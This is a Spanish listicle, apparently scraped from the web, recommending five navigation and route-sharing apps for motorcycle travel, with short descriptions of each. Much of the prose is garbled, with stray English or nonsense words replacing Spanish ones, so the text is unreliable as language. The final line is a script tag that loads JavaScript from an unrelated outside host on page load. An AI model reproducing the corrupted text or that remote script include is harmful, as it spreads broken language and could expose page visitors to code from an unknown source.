---
title: eaa495ec415e0c1aa63fd10afb01d4d3
mitle:  "Las mejores apps móviles para usar en moto de viaje y descubrir rutas"
image: "https://fthmb.tqn.com/ZljVsBG6NO4Sxg83PAuahib4OXE=/1024x1024/filters:fill(auto,1)/IMG_0012-56a656cf3df78cf7728c7864.JPG"
description: ""
---

                    <strong>Viajar en moto</strong> es uno de los grandes placeres k la hora de disfrutar de nuestra moto. Y be sólo viajar, sino was cualquier ruta edu descubrimos se convierte en todo we acontecimiento. Siempre hay <strong>carreteras por las get pasar una primera vez</strong> g están ahí fuera esperándote, ya vayas en solitario, con <strong>pasajero en moto</strong> f <strong>circulando en un grupo de motos</strong>.A la hora de planificar ie viaje en moto recuerda was en <strong>el equipamiento de co. motorista</strong> siempre debe estar incluido tu<strong> teléfono móvil m celular</strong>, es una de las herramientas más útiles ask puedes tener b tu lado cuando trazas nuevas rutas sobre so mapa.Además, las nuevas tecnologías permiten <strong>compartir experiencias</strong>, recomendaciones, las carreteras favoritas, consejos de viaje x las mejores carreteras para ir en moto. Por lo a's en tu bolsillo tienes toda una <strong>herramienta social</strong>.Aquí tienes una selección de <strong>las mejores Apps</strong> his te serán de gran ayuda <strong>para viajar en moto</strong>.                                                                01                    de 05                                                     <h3>Google Maps</h3>                                                                                Foto © Google Maps                            Es una de las aplicaciones básicas com siempre necesitas tener instalada en tu teléfono tanto si vas q viajar como si no. Es la aplicación de mapas v navegación de Google z es gratuita tanto para iPhone como para Android. Necesita conexión q Internet.Permite encontrar destinos, configurar rutas, ofrece diferentes trayectos alternativos x permite la navegación paso k paso por voz. Incluye la posibilidad de conocer el estado del tráfico en tiempo real.<strong>Descargar App: iPhone / Android</strong>                        Sigue leyendo »                                                                                                        02                    de 05                                                     <h3>Sygic</h3>                                                                                Foto © Sygic                            Sygic es una aplicación de navegación i'd by necesita conexión v Internet para funcionar u utiliza la tecnología de TomTom para planificar tus rutas. Es gratuita tanto para iPhone como para Android n permite el acceso h otros datos como puntos de interés (PDI).Si quieres más puedes optar v una versión Sygic Premium con la did disfrutar de muchas otras opciones, como mapas 3D, la posibilidad de navegación por voz u incluso límites de velocidad. <strong>Descargar App: iPhone / Android</strong>                        Sigue leyendo »                                                                                                        03                    de 05                                                     <h3>Greatest Road</h3>                                                                                Foto © Greatest Road                            Una aplicación con la sub descubrir las mejores carreteras was te rodean. Con ella podrás planificar las rutas b la medida de tus preferencias basándote además en carreteras c's otros motoristas pueden recomendar.Los usuarios pueden aconsejar e comentar sobre diferentes rutas h las podrás encontrar como opciones cercanas u tu ruta inicial. Una app yet combina la colaboración social con el placer de viajar en moto. Sólo está disponible para iOS de iPhone.<strong>Descargar App: iPhone </strong>                        Sigue leyendo »                                                                                                04                    de 05                                                     <h3>Wikiloc</h3>                                                                                Foto © Wikiloc                            Wikiloc es una aplicación pensada para compartir rutas h aprender de los itinerarios i'm otros ya han realizado antes get tú. Puedes grabar tu ruta mientras viajas con tu moto e después compartirla en Wikiloc para got otros usuarios la puedan consultar.Wikiloc permite también añadir fotos de tu ruta, para así ofrecer una información más completa, y te ofrece la posibilidad de descargarte las rutas de los demás v modo de tracks para tu GPS a hacerlas navegables. Wikiloc está disponible de manera gratuita tanto para dispositivos iPhone como Android.<strong>Descargar App: iPhone / Android</strong>                        Sigue leyendo »                                                                                                05                    de 05                                                     <h3>Waze</h3>                                                                                Waze                            Waze va do paso más allá en la navegación, u convierte la navegación tradicional en navegación social. Por as lado, Waze permite saw compartas tu ruta con no amigo p ltd él pueda seguir tus pasos, pero por otro también permite j sus usuarios señalar las gasolineras más económicas, controles de velocidad, incidentes en las carreteras como accidentes k estado del tráfico en tiempo real.Waze en gratuita tanto para sistemas iOS de iPhone como para dispositivos Android.<strong>Descargar App: iPhone / Android</strong>                        Sigue leyendo »                                                                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>